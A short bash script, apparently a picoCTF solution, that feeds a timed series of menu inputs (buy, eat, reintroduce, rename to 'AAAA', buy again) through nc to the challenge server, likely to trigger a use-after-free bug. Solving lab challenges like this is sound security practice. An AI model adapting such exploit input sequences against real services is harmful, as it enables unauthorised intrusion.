#!/bin/bash
(
echo "test"  # nombre
sleep 0.5
echo "1"     # buy
sleep 0.5
echo "100"   # size
sleep 0.5
echo "2"     # eat
sleep 0.5
echo "0"     # which
sleep 0.5
echo "3"     # reintroduce
sleep 0.5
echo "AAAA"  # new name
sleep 0.5
echo "1"     # buy again
sleep 0.5
echo "100"   # size
sleep 0.5
cat          # mantener conexión
) | nc jupiter.challenges.picoctf.org 9521